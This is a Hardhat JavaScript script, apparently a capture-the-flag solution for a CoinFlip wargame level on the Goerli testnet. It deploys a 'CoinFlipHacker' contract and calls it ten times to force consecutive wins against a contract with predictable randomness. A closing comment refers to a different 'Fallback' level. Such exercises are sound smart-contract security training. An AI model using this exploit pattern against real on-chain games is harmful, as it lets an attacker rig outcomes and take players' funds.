// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
require('dotenv').config({ path: __dirname + '/.env' });

const { ethers } = require("hardhat");

async function main() {
    [player] = await ethers.getSigners();
    hacker = await (await ethers.getContractFactory("CoinFlipHacker")).deploy(process.env.COINFLIP_ADDRESS);
    coinFlip = await ethers.getContractAt("CoinFlip", process.env.COINFLIP_ADDRESS);
    await hacker.deployed();

    console.log("initial consecutiveWins is ", await coinFlip.consecutiveWins());
    for (i=0; i<10; i++) {
        const transactionResponse = await hacker.flip({gasLimit: 2_000_000});
        await transactionResponse.wait();
    }
    console.log("consecutiveWins after 10 times flip is ", await coinFlip.consecutiveWins());

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
// run this script after Fallback contract was deployed
// npx hardhat run scripts/deploy.js --network goerli